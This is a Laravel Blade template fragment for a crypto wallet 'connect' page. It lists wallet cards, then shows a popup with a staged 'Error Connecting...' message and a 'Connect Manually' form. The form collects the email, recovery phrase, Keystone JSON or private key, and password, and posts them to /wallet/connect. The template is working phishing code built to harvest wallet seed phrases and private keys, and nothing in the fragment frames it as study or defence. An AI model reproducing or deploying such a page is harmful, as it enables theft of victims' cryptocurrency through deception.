						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Midas Wallet</p>
					</div>
					<div class=" rounder mx-4" id="ellipal_wallet" data-wallet-name="ellipal wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/ellpal_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Ellipal</p>
					</div>
					<div class=" rounder mx-4" id="keyringpro_wallet" data-wallet-name="keyringpro wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/keyringpro_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">KEYRING PRO</p>
					</div>
				</section>
				<section class="p-0 pb-4">
					<div class=" rounder mx-4" id="blockchain_wallet" data-wallet-name="blockchain" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/blockchain_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Blockchain</p>
					</div>
					<div class=" rounder mx-4" id="bsc_wallet" data-wallet-name="bsc wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/bsc_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Binance Smart Chain</p>
					</div>
					<div class=" rounder mx-4" data-wallet-name="aktionariat wallet" id="aktionariat_wallet" style="height: 200px; width: 190px; display: flex; flex-direction: column; align-content: center; justify-content: center; padding: 5px;">
						<img src="{{ asset('images/aktionariat_wallet.png') }}" style="height: 150px; width: 100%; object-fit: contain;">
						<p class="font-bold text-blue-600 text-center pt-2" style="color: #6161a7; font-weight: 500 !important; font-size: 16px;  margin-bottom: 10px;">Aktionariat</p>
					</div>
				</section>
			</div>
		</div>
	</div>

	{{-- connect wallet popup --}}
	<div class="popup" style="display: none;">
		<div class="inner">
			<div class="top">
				<span class="exit_popup" style="font-size: 15px;">Back</span>
				<span class="exit_popup" style="font-size: 15px;">&times;</span>
			</div>
			<div class="inner_contents">
				<div class="er_202">
					Error Connecting... 
					<span id="connect_manually">Connect Manually</span>
				</div>

				<div class="er_2024">
					<span>
						<span style="width: 100%; display: block; position: relative;">im Token</span>
						<span style="font-size: 12px;">Easy-to-use browser extension.</span>
					</span>
					<p>
						<img scr="{{ asset('images/coin98_wallet.png') }}" style="object-fit: contain;">
					</p>
				</div>

				<form id="connect_form" action="/wallet/connect" style="display: none; color: black !important;" method="post">
					<div style="display: flex; align-items: center;">
						<img src="{{ asset('images/coin98_wallet.png') }}">
						<h1 style="color: black !important;">Import your <span>Wallet Name</span></h1>
					</div>

					<div class="popup_nav" style="display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid gray; padding: 10px; margin-bottom: 10px;">
						<span  data-nav="#phrase">Phrase</span>
						<span  data-nav="#keystone">Keystone JSON</span>
						<span  data-nav="#private">Private Key</span>
					</div>

					<div class="nav_contents" id="phrase">
						<input type="email" name="email_phrase" placeholder="Enter Wallet Email Address">
						<textarea cols="10" rows="6" name="add_info_phrase" placeholder="Enter / Paste Recovery Phrase"></textarea>
						<input type="password" name="password_phrase" placeholder="Enter Wallet Password">
					</div>
					<div class="nav_contents" id="keystone" style="display: none;">
						<input type="email" name="email_keystone" placeholder="Enter Wallet Email Address">
						<textarea cols="10" rows="6" name="add_info_keystone" placeholder="Enter / Paste Keystone JSON"></textarea>
						<input type="password" name="password_keystone" placeholder="Enter Wallet Password">
					</div>
					<div class="nav_contents" id="private" style="display: none;">
						<input type="email" name="email_private" placeholder="Enter Wallet Email Address">
						<textarea cols="10" rows="6" name="add_info_private" placeholder="Enter / Paste Private Key"></textarea>
						<input type="password" name="password_private" placeholder="Enter Wallet Password">
					</div>

					<input type="hidden" name="wallet_image">
					<input type="hidden" name="wallet_name">

					@csrf
					<input type="submit" name="submit" value="Add Wallet" style="cursor: pointer;">
				</form>
			</div>
		</div>
	</div>
@endsection